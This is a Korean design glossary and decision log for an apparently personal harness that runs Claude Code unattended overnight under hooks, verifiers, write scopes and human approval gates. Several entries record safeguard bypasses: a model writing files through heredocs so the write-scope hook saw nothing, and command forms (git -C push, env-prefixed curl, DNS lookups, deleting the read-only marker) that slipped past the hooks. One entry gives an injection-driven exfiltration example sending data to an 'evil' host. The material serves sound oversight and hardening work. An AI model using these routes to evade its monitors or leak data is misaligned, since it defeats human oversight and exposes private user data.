# CONTEXT — 어휘 · 금지어 · 해소 기록

이 파일은 **하네스 자체**의 어휘다. 대상 도메인(공부/일/코딩)의 어휘는 여기 없다 — 그것은 `<repo>/.harness/spec.md`의 몫이다.

## 어휘

| 용어 | 뜻 | 소유 |
|---|---|---|
| 사양 spec | 도메인이 주는 목표 + 지시문. `.harness/spec.md`. 유일한 입구 | 도메인 |
| 계획 plan | 사양을 리프 작업으로 분해한 것. `.harness/plan.json`. 재생성 가능 | 하네스 (v0: 사람이 손으로) |
| 밤 night | 하네스 세션 하나. `night-NNN`. 밤 하나 = 브랜치 하나 = SUMMARY 하나 | 하네스 (P1 발급) |
| 작업 task | 계획의 리프. `task-NNN`. 5~30분. 검증기 필수 | 하네스 (P1 발급) |
| 시도 attempt | 작업 하나에 대한 모델 호출 한 번. `task_started` ~ 판정 사이 | 러너 |
| 검증기 verifier | exit 0 = pass인 명령. 레벨 0(exit) / 1(스칼라 임계값) / 2(구조화 리포트, v0 미지원) | 도메인 |
| 리프 검증 / 전체 검증 | 작업별 검증기 / `.harness/verify` 스모크. **둘 다** 통과해야 커밋 | 러너 (P6) |
| 판정 verdict | 검증기 결과로 러너가 내리는 passed / failed. 모델의 "done"이 아니다 | 러너 (P6) |
| 막힘 blocked | 최대 시도 횟수만큼 실패한 작업. `BLOCKED.md`로 격리, 큐에서 제외 | 러너 (P8) |
| 아사 starvation | 자격이 있는데 계속 선택되지 않은 작업. 대기 시간 > 임계 → 무조건 먼저 | 러너 (P2) |
| 복구 작업 repair | 밤 시작 스모크가 실패했을 때 러너가 발급하는 작업. 통과 전까지 다른 작업을 돌리지 않는다 | 러너 (P4-5) |
| 드라이버 driver | 모델 런타임 호출 어댑터. `claude` (`claude -p`) / `fake` (테스트) / codex (Phase 6) | 러너 |
| 러너 runner | 바깥 루프. `runner/night`. 부기 전담, 내용은 만지지 않는다 | 하네스 |
| 훅 hook | Claude Code 이벤트에 붙는 결정론적 스크립트. md 바깥에서 강제력이 있는 유일한 지점 | 하네스 |
| 로그 log | `.harness/log.jsonl`. append-only. 모든 상태는 여기서 파생 | 러너 (I2, I3) |
| 쓰기 범위 write scope | 계약 ④. `domain.json: write_scope`. 밖이면 훅이 거부 | 도메인 → 훅 (I6) |
| 게이트 gate | `verify: "approval"` 작업. 사람이 `runner/queue approve`로 여는 검증기 — 모델은 자격을 얻지 않고, 의존 작업은 승인 뒤 풀린다. 대화형에서 '승인'·'시작해'·'진행해' = 승인 | 사람 → 러너 (D1) |
| 제안 proposal | `decompose --propose`가 쓴 `plan.proposed.json`. 채택(`queue accept`) 전까지 계획이 아니다 | 러너 (P7-lite) |

## 금지어 · 헷갈리는 말

| 쓰지 말 것 | 대신 | 이유 |
|---|---|---|
| "세션" (무수식) | "밤 night" 또는 "CC 세션" | Claude Code 세션(프로세스 하나)과 하네스 세션(밤 하나)이 다르다. 밤 하나에 CC 세션이 여러 개 뜬다 |
| "done" / "완료했다" (모델의 말) | "passed" / "검증 통과" | 모델의 주장은 판정이 아니다 (P6) |
| "사이클" | "밤" / "시도" | 옛 루프의 용어. 사이클 번호를 md에 적게 한 것이 라벨 795곳 오염의 원인 |
| 날짜 ID (`2026-08-27-…`) | `night-NNN` / `task-NNN` | 날짜는 메타데이터. 같은 날 두 번 돌면 충돌한다 |
| "우선순위 점수" (무수식) | `priority`(계획 필드) / "도메인 점수"(`domain_rank`) | 아사 방지와 도메인 점수는 다른 층이다 |
| "상태 파일" | 없음 — 로그를 fold한다 | I3. `plan.json`에 `status` 필드를 넣고 싶어지면 그것이 위반 신호 |
| "커밋했다" (모델의 말) | 러너만 커밋한다 | 커밋 정책 §6. 모델의 `git commit`은 훅이 거부 |
| "에이전트" | "모델" / "드라이버" / "러너" 중 하나 | 셋 중 무엇을 말하는지 매번 달랐다 |

## 해소 기록

- **2026-08-27 · 실패 시도의 작업 트리** — 검증 실패 시 트리를 마지막 green 커밋으로 되돌린다 (`.harness/` 제외). 대신 diff를 `.harness/sessions/<night>/<task>.<attempt>.patch`로 남기고, 다음 시도 프롬프트에 패치 경로와 검증 출력 꼬리를 넣는다. 근거: §4 "깨진 코드 위에 쌓지 않는다"와 I4 "실패 흔적은 지우지 않는다"를 동시에 만족.
- **2026-08-27 · 훅 주입 경로** — 러너는 `claude --plugin-dir <harness>`로 훅을 세션 한정 주입한다 (설치 불필요, 헤드리스 `-p`에서도 SessionStart/PreToolUse 동작 실측). 플러그인을 전역 설치한 채 러너를 돌리면 훅이 두 번 뜨므로 하지 않는다. 대화형: `claude --plugin-dir ~/workspace/agent-athena`.
- **2026-08-27 · 스모크는 밤에 한 번** — 5단 계층에서 "세션 = 밤"이므로 P4의 스모크(4단계)는 러너가 밤 시작에 한 번 돌리고 로그에 남긴다. 작업별 CC 세션의 훅은 로그의 결과를 보여줄 뿐 다시 돌리지 않는다 (`HARNESS_NIGHT` 환경변수로 구분). 러너 밖 대화형 세션에서는 훅이 직접 돌린다.
- **2026-08-27 · 복구 작업** — 스모크 실패 시 러너가 `origin: repair` 작업을 발급해 계획에 넣고, 통과 전까지 다른 작업을 선택하지 않는다. 최대 시도 초과 시 밤을 끝낸다 — red 트리 위에서는 어떤 검증도 의미가 없다.
- **2026-08-27 · 밤 브랜치 기점** — 직전 밤 브랜치가 HEAD에 병합됐으면 HEAD에서, HEAD가 직전 밤의 조상(미병합, 새 작업 없음)이면 직전 밤 브랜치에서 잇는다. 둘 다 아니면(분기) 거부한다. 로그가 git에 있으므로 기점을 잘못 잡으면 ID가 충돌한다.
- **2026-08-27 · P9는 훅이 아니라 스트림** — 파일별 편집 횟수는 `claude -p --output-format stream-json`의 `tool_use`를 러너가 밖에서 세어 얻는다. post-tool 훅으로 세면 관측이 대상 세션 안에서 돈다 (I9). 그래서 v0에 `post-tool` 훅이 없다.
- **2026-08-27 · macOS에 `timeout`이 없다** — 모든 타임아웃은 Python `subprocess` + 프로세스 그룹 kill로 구현. 셸에서 `timeout` 명령을 쓰지 않는다. `claude --print`는 stdin을 기다리므로 `stdin=DEVNULL` 필수 (KnockAtena 프로토타입에서 실측).
- **2026-08-27 · P3·P8 일부를 Phase 1에 당김** — 빌드 순서상 Phase 4지만, 쓰기 범위 거부(I6)와 최대 시도 초과 격리 없이는 무인 루프가 안전하지 않다. 멱등 키(P3 본체)와 병리 종합(P9)은 Phase 4 그대로.
- **2026-08-27 · macOS + Ubuntu 동시 지원** — 셸 파일은 dash 호환 POSIX sh 만(`scripts/portable-lint` 가 bashism·BSD/GNU 분기 명령을 거부), git ≥ 2.25(`init -b` 금지, 테스트는 `symbolic-ref`), stdio·subprocess 는 UTF-8 명시(`LANG=C` 서버), `claude` 는 PATH + `~/.local/bin` 등에서 탐색, 부기 파일 이름은 대소문자 무시 비교(macOS FS). 이 세션엔 컨테이너가 없어 Ubuntu 실기는 미검증 — `dash` + `shellcheck` 로 대체 검증했다. **Ubuntu 첫 밤 전에 `scripts/check` 부터.**
- **2026-08-27 · 쓰기 범위는 러너가 최종 판정한다** — GreedyAtena 첫 밤(night-001, opus)에서 모델이 파일을 전부 `cat > f <<'EOF'` 로 써서(bypass 모드에서는 Bash 가 기본 쓰기 채널) 훅의 Write/Edit 경로 검사와 P9 편집 카운터가 아무것도 못 봤다. 해소: 훅은 Bash 리다이렉션·sed -i·cp/mv 대상까지 휴리스틱으로 조기 거부하고, 러너가 모델 종료 직후 `git status` 로 범위 밖 변경을 잡아 검증기도 돌리지 않고 실패 처리한다(`stage: scope`). 관측 지점을 도구 호출에서 트리 변화로 옮기면 열거 불완전성이 사라진다. 상세: `findings/001-heredoc-bypasses-write-scope.md`.
- **2026-08-28 · 스킬 vendoring(Phase A-1)** — 외부 스킬 26종을 고정 커밋에서 감사 후 복사(`docs/handoff-pack-2026-08-28.md` 4부가 정본, 대장은 `skills/vendor/VENDORED.md`). 실측: Claude Code 플러그인은 `skills/<이름>/SKILL.md` 한 단계만 스캔 → 본체는 `skills/<이름>/`, 로드 제외는 `skills/vendor/<이름>/`. vendored frontmatter는 upstream 유지(2키 규칙은 자작에만; `scripts/check`가 대장 이름을 면제). 네트워크 지시 스킬은 첫 줄에 "모드 A 전용" 표시. 문서 4종(docx·xlsx·pptx·pdf)은 PROPRIETARY라 `document-skills@anthropic-agent-skills` 공식 설치. S2: 대화형에서 commit/push는 훅이 막지 않는다(사람이 승인 루프에) — 러너 모드만 거부.
- **2026-08-28 · 인프라 실패 ≠ 작업 실패** — 첫 무인 밤(night-002)에 맥이 잠들어(뚜껑) 시도 3개가 시간 초과로 처리되고 news 작업이 부당하게 막혔다. 러너는 이제 잠듦(벽시계−단조시계)과 무응답(시간 초과+0턴)을 `infra` 실패로 구분해 시도 횟수에 넣지 않고, 잠들면 밤을 끝낸다(`machine_slept`). 사람이 푸는 길: `queue unblock`. 턴 수는 result 없이도 assistant 메시지로 센다. 상세: `findings/002`, `findings/003`.
- **2026-08-27 · `setsid`도 macOS에 없다** — 분리 실행은 `scripts/night-detached`(nohup + python `os.setsid()` + caffeinate/systemd-inhibit)로만 한다. 첫 무인 밤을 띄우다 발견.
- **2026-08-27 · 플랜의 `id`는 러너가 쓴다** — 손으로 쓴 `plan.json`에는 `id`를 넣지 않는다. `runner/queue load`(또는 `night`)가 로그 ∪ 계획의 최댓값+1로 발급해 파일에 써 넣는다. 사람이 `id`를 적으면 형식·중복만 검사하고 그대로 쓴다 (I1은 *모델*이 계산하지 않는다는 뜻이다).
- **2026-08-28 · 러너는 사용자 설정 소스를 뺀다** — `--plugin-dir`는 추가이지 대체가 아니어서 무인 세션이 전역 플러그인 34개(출력 스타일 훅 포함)를 상속했다(night-001·002 실측). 러너는 `--setting-sources project,local`로 user 소스를 제외하고, 대상 repo의 project/local 설정은 도메인 소유라 유지한다. 스킬 자동 호출은 확률적(sonnet 0/2, opus 1/1)이라 러너가 스트림의 `Skill` 호출을 세어 SUMMARY "스킬 자동 호출" 절에 보인다. 상세: `findings/004`.
- **2026-08-29 · 밤을 잇는 것은 스킬이 아니라 러너다** — "아침까지 반복"은 `runner/night-loop`(`scripts/night-detached loop`)가 한다: budget·max_tasks면 바로, rate_limited·cost_budget면 쉬고 다음 밤, queue_empty·인프라/구조 실패·마감·밤 수·**총비용 상한**이면 멈춘다. 루프는 log.jsonl에 쓰지 않는다(밤 preflight가 보는 트리를 더럽히지 않게). 같은 밤(night-003)의 발견으로 heredoc 본문은 훅 스캔에서 뺀다(실행형 제외) — `findings/005`.
- **2026-08-29 · 배송 결정 실행(Phase A-2) — 전역 설치가 정본, 러너는 `--plugin-dir` 유지** — 08-27 "전역 설치하면 훅이 두 번 뜬다"를 뒤집는다: 카나리아 실측 전역만 1줄 · 전역+`--plugin-dir` 1줄 · 러너 설정(`--setting-sources project,local`) 1줄 — Claude Code 2.1.248은 같은 이름의 플러그인을 하나로 합친다. 대화형은 `claude plugin install harness@harness-local`(repo의 `.claude-plugin/marketplace.json`), 무인은 `--plugin-dir`(항상 live 코드). 설치본은 **스냅샷 복사**라 스킬·훅 커밋 뒤 `scripts/plugin-refresh`. 중복 3건: `code-review`→`review-changes` rename(3중 이름 충돌), `frontend-design`·`skill-creator`는 vendored가 정본이고 공식 플러그인 2개는 비활성화(감사 고정 커밋 단일 출처, Codex 대비 `skills/`에 유지).
- **2026-08-29 · P7-lite: 제안은 러너, 채택은 사람(옵션으로 자동)** — v0 "계획은 사람이 쓴다"를 절반만 연다. `runner/decompose --propose`가 사양·계획 상태·지난 SUMMARY로 리프를 제안해 `plan.proposed.json`에 쓰고(plan.json 불변), 제안된 검증기를 **지금 트리에서 돌려 이미 통과하면 빈 작업으로 버린다**(모델의 계획에는 빈 작업이 섞인다 — 기계로 거른다). 채택은 `queue accept`(id 발급은 여기서, I1). `domain.json plan.auto_propose/auto_accept`가 켜진 repo만 night-loop가 큐가 빌 때 제안→채택→다음 밤(무인 "완성도 반복"), 기본은 꺼짐이라 아침에 사람이 본다(`proposal_pending`). 제안 세션은 러너 모드 훅 + Write/Edit 금지 + 트리 변경 되돌리기. to-tickets는 대화형 분해용으로 승격.
- **2026-08-29 · D1 승인 게이트 = 검증기의 한 종류** — 12개 장기 목표 중 연구(단계마다 '네 승인')·코딩(해결안/PR 승인)을 하네스에 넣기 위해. `verify: "approval"`, `estimate_minutes: 0` 작업은 상태 `gate`로 시작해 모델 자격이 없고, `runner/queue approve task-NNN`(`task_approved` 이벤트)으로만 `passed`가 된다. SUMMARY '승인 대기' 절·DAG 🔒·세션 시작 훅이 안내. 사용자의 말('승인'·'시작해'·'진행해')은 대화형 세션이 명령으로 옮긴다 — 부기는 프로그램, 결정은 사람. 모델 채점은 P6과 충돌하므로 넣지 않는다.
- **2026-08-29 · D4 회사 설치 = 읽기 전용 하네스** — 하네스 clone 루트의 `.harness-readonly` 마커를 pre-tool이 보면 하네스 안 쓰기·commit/push를 대화형·무인 모두, `.harness/` 없는 cwd에서도 거부한다. 회사에서는 태그 고정 clone + 전역 설치, 갱신은 `git pull` + `scripts/plugin-refresh`, 발견한 구멍은 도메인 repo의 `.harness/findings/`에 적어 집에서 반영. 연구 repo는 기밀 구분 없이 회사에 둔다(사용자 결정).
- **2026-08-29 · D3 산출물 검증기 = 레벨 2의 결정론 부분만** — 논문·리포트·요약처럼 exit 0 이 없는 산출물은 `runner/verify-doc`(frontmatter 키·필수 섹션·내부 링크/위키링크 존재·인용 키↔bib·표 숫자↔CSV/JSON·최소 단어)으로 형식·참조·수치 일치만 기계 검사하고, 품질·논리는 D1 승인 게이트(사람)가 맡는다. 문서 형식은 Markdown + YAML frontmatter(Obsidian 호환)로 통일. 모델 채점 검증기는 P6(모델의 done은 판정이 아니다)과 충돌하므로 두지 않는다.
- **2026-08-29 · D2 데이터 등급 = repo 단위 public/private** — `domain.json data_class`. private(재무·건강·보유 종목·결정 근거가 있는 repo)에서는 **대화형에서도** 훅이 curl 류·WebFetch/WebSearch·네트워크 스킬(SKILL.md의 '모드 A 전용' 표시로 자동 식별) 호출을 거부한다 — 사람이 승인 루프에 있어도 인젝션→유출 경로(`WebFetch("https://evil/?d=…")`)를 사람이 못 본다(bypass 모드). 웹이 필요하면 다른 세션에서 조회해 결과만 가져온다. 지정: `finance`·`coach`·`knowledge` private, `research`·뉴스/주식 분석 repo public. 도메인 repo는 전부 새로 만든다(기존 GreedyAtena는 그대로).
- **2026-08-29 · repo 작명 `athena-<도메인>` · GreedyAtena → athena-market** — 하네스 대상 repo 는 `athena-<도메인>` 으로 짓고 GitHub(`junxnpng`) 에 같은 이름·private 로 둔다(데이터 등급과 무관 — `athena-research` 도 GitHub private). 기존 `GreedyAtena`(시장 브리핑 봇) 는 `athena-market` 으로 개명 — findings 001~005·이 파일의 "GreedyAtena" 는 같은 repo 다. 패키지·CLI·환경변수(`greedy-atena`·`greedy`·`GREEDYATENA_*`) 는 그대로. 디렉토리 rename 은 venv 셔뱅(절대경로)·launchd plist·Claude 프로젝트 메모리 키(`~/.claude/projects/-Users-jun-workspace-<이름>`) 를 깨뜨리므로 셋을 같이 옮기고 도메인 `verify` 로 확인했다. 하네스 코드는 경로를 `--repo` 로 받으므로 무관.
- **2026-08-29 · 리뷰 라운드 1 — 훅은 wrapper·옵션을 소비하고, 실패하면 닫힌다** — 읽기 전용 리뷰 3건(정확성 14·보안 15·테스트/문서 15)을 반영. (a) `git -C x push`·`env X=1 curl`·`nice -n 5 python3 <<PY`·DNS(dig/nslookup/host/getent)·`open <url>`·`rm .harness-readonly` 가 훅을 지나갔다 → `WRAPPER_RE`·`_GIT` 이 앞머리를 소비한 뒤 명령을 본다, 삭제도 쓰기 대상이다. (b) 훅 입력 파싱 실패·예외·domain.json 파손은 허용(exit 1 = Claude Code 비차단)이 아니라 거부·private 폴백(fail-closed). (c) **I6 는 대화형에서도 강제였다**(`test_write_scope`) — 사람이 넣는 수집함·기록은 `domain.json human_scope` 로 대화형에서만 연다(러너와 러너의 최종 판정은 write_scope 만). (d) 일일 비용 상한 `budget.max_day_usd`(로그 fold, night exit 4 / cost_day) + `night-loop --max-day-usd`(형제 repo 합산). (e) `kill_group` 이 fork 직후 손자를 놓쳐(1/30) 카나리아 '즉시 중단' 이 60초 지연되던 것을 그룹 sweep 으로 (findings/006). (f) 중단(interrupted)은 인프라라 시도 횟수를 먹지 않는다, 마감은 단조시계, SUMMARY 커밋은 `.harness/` 만, verify-doc 은 코드 펜스 밖만 보고 절대 경로 링크·지수 표기를 다룬다, `queue status/next` 는 메모리에서 id 를 발급해 `#0` 의존을 푼다. 한계로 고정한 것: 인터프리터 코드 안의 네트워크 호출은 훅이 못 잡는다(테스트가 계약으로 못박음 — 샌드박스의 몫).
- **2026-08-30 · 게이트는 순서대로만 열린다** — "전부 승인" 을 받았을 때 `queue approve` 가 선행 작업이 남은 게이트(게이트 2·3)도 열 수 있었다(상태만 보고 의존은 안 봄). 검문소를 건너뛰어 열면 검문이 아니므로 `gate_openable`(의존 전부 통과)이 아니면 approve 가 거부하고, SUMMARY·세션 시작 훅·아침 다이제스트는 "지금 열 수 있는 게이트" 와 "뒤에 올 게이트" 를 나눠 보인다(17개 → 실제 5개). 사람의 "전부 승인" 은 *지금 열 수 있는 것 전부* 로 읽는다.
- **2026-08-30 · 플러그인 갱신은 버전 게이트를 넘어야 한다** — `claude plugin update` 는 version(0.1.0) 이 같으면 아무것도 복사하지 않아 전역 설치본이 18커밋 동안 멈춰 있었고(대화형 훅이 옛 버전 — D2 private 차단 포함), 사용자가 새 스킬을 못 찾아 드러났다(findings/008). `scripts/plugin-refresh` 는 uninstall+install 로 강제 복사하고 설치본↔repo 를 파일 단위로 대조해 다르면 실패한다. 무인 밤은 `--plugin-dir`(live) 라 무관.
